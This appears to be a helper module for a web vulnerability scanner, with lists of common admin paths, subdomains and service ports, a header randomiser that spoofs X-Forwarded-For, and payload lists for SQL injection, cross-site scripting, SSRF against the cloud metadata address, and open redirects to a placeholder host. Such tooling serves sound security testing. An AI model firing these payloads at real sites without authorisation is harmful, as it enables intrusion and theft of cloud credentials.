import random
import string
from urllib.parse import urlparse, urljoin

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
]

COMMON_DIRS = ['admin', 'login', 'dashboard', 'api', 'backup', 'config', '.git', 'uploads']
COMMON_SUBDOMAINS = ['www', 'api', 'dev', 'test', 'staging', 'admin', 'mail']
COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 110: 'POP3', 135: 'RPC',
    139: 'NetBIOS', 143: 'IMAP', 389: 'LDAP', 443: 'HTTPS', 445: 'SMB', 587: 'SMTP',
    636: 'LDAPS', 1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
    5985: 'WinRM', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
}

SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "1' AND SLEEP(5)--", "1);WAITFOR DELAY '0:0:5'--"]
XSS_PAYLOADS = ['<script>alert(1)</script>', '"/><svg/onload=alert(1)>', "<img src=x onerror=alert(1)>"]
SSRF_PAYLOADS = ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/']
REDIRECT_PAYLOADS = ['https://evil.example', '//evil.example']


def random_header():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': '.'.join(str(random.randint(1, 254)) for _ in range(4)),
        'X-Request-ID': ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    }


def normalize_target(target):
    if not target.startswith('http'):
        return 'http://' + target
    return target


def get_domain(target):
    return urlparse(normalize_target(target)).netloc


def make_url(base, path):
    return urljoin(base if base.endswith('/') else base + '/', path)
